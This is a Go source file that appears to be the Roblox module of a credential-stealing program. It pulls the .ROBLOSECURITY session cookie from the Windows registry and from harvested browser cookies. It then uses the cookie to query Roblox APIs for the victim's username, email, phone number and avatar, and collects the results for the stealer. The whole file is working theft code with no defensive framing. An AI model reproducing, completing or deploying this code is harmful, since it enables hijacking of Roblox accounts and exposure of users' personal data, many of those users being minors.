package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"golang.org/x/sys/windows/registry"
)

type RobloxAccountResult struct {
	UserID      int
	Cookie      string
	Username    string
	Email       string
	Phone       string
	DisplayName string
	CreatedAt   time.Time
	AvatarUrl   string
	FoundIn     string
}

var robloxResults []RobloxAccountResult

func findRobloxBrowserCookies() (string, string) {
	for _, cookie := range cookies {
		if cookie.URL == ".roblox.com" && cookie.Name == ".ROBLOSECURITY" {
			return cookie.Value, cookie.BrowserName
		}
	}
	return "", ""
}

func findRobloxRegistryCookies() (string, string) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Roblox\RobloxStudioBrowser\roblox.com`, registry.QUERY_VALUE)
	if err != nil {
		return "", ""
	}
	defer k.Close()

	cookie, _, err := k.GetStringValue(".ROBLOSECURITY")
	if err != nil {
		return "", ""
	}
	return cookie, "Roblox Desktop App"
}

type robloxUserAccount struct {
	UserID           int    `json:"UserId"`
	Username         string `json:"Name"`
	Display          string `json:"DisplayName"`
	Email            string `json:"UserEmail"`
	AccountAgeInDays int    `json:"AccountAgeInDays"`
}

func fetchUserData(cookie string) (*robloxUserAccount, error) {
	req, err := http.NewRequest("GET", "https://www.roblox.com/my/settings/json", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Cookie", ".ROBLOSECURITY="+cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
	res, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return nil, err
	}

	var userData robloxUserAccount
	err = json.NewDecoder(res.Body).Decode(&userData)

	if err != nil {
		return nil, err
	}

	return &userData, nil
}

func getPhoneNumber(cookie string) (string, error) {
	if cookie == "" {
		return "", nil
	}
	req, err := http.NewRequest("GET", "https://accountinformation.roblox.com/v1/phone", nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Cookie", ".ROBLOSECURITY="+cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
	res, err := httpClient.Do(req)
	if err != nil {
		return "", err
	}

	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return "", err
	}

	var phoneData struct {
		Phone string `json:"phone"`
	}
	err = json.NewDecoder(res.Body).Decode(&phoneData)

	if err != nil {
		return "", err
	}

	return phoneData.Phone, nil
}

func getAvatarUrl(userID int, cookie string) string {
	if userID == 0 || cookie == "" {
		return ""
	}
	payload, _ := json.Marshal([]any{
		map[string]any{
			"format":    "png",
			"requestId": fmt.Sprintf("%d::AvatarHeadshot:150x150:png:regular:", userID),
			"size":      "150x150",
			"targetId":  userID,
			"token":     "",
			"type":      "AvatarHeadshot",
			"version":   "",
		},
	})
	req, err := http.NewRequest("POST", "https://thumbnails.roblox.com/v1/batch", bytes.NewReader(payload))
	if err != nil {
		return ""
	}
	req.Header.Set("Cookie", ".ROBLOSECURITY="+cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
	req.Header.Set("Content-Type", "application/json")
	res, err := httpClient.Do(req)
	if err != nil {
		return ""
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return ""
	}

	var avatarData struct {
		Data []struct {
			ImageURL string `json:"imageUrl"`
		} `json:"data"`
	}
	err = json.NewDecoder(res.Body).Decode(&avatarData)

	if err != nil || len(avatarData.Data) == 0 {
		return ""
	}

	return avatarData.Data[0].ImageURL
}

func GrabRoblox() {
	registryCookie, foundIn := findRobloxRegistryCookies()
	if registryCookie != "" {
		userData, err := fetchUserData(registryCookie)
		phone, _ := getPhoneNumber(registryCookie)
		if err == nil && userData != nil {
			robloxResults = append(robloxResults, RobloxAccountResult{
				UserID:      userData.UserID,
				Cookie:      registryCookie,
				FoundIn:     foundIn,
				Username:    userData.Username,
				Email:       userData.Email,
				Phone:       phone,
				DisplayName: userData.Display,
				CreatedAt:   time.Now().AddDate(0, 0, -userData.AccountAgeInDays),
				AvatarUrl:   getAvatarUrl(userData.UserID, registryCookie),
			})
		} else {
			robloxResults = append(robloxResults, RobloxAccountResult{
				Cookie:  registryCookie,
				FoundIn: foundIn,
			})
		}
	}

	cookie, browser := findRobloxBrowserCookies()
	if cookie != "" && cookie != registryCookie { // Avoid duplicates
		userData, err := fetchUserData(cookie)
		phone, _ := getPhoneNumber(cookie)
		if err == nil && userData != nil {
			robloxResults = append(robloxResults, RobloxAccountResult{
				UserID:      userData.UserID,
				Cookie:      cookie,
				FoundIn:     browser,
				Username:    userData.Username,
				Email:       userData.Email,
				Phone:       phone,
				DisplayName: userData.Display,
				CreatedAt:   time.Now().AddDate(0, 0, -userData.AccountAgeInDays),
				AvatarUrl:   getAvatarUrl(userData.UserID, cookie),
			})
		} else {
			robloxResults = append(robloxResults, RobloxAccountResult{
				Cookie:  cookie,
				FoundIn: browser,
			})
		}
	}
}
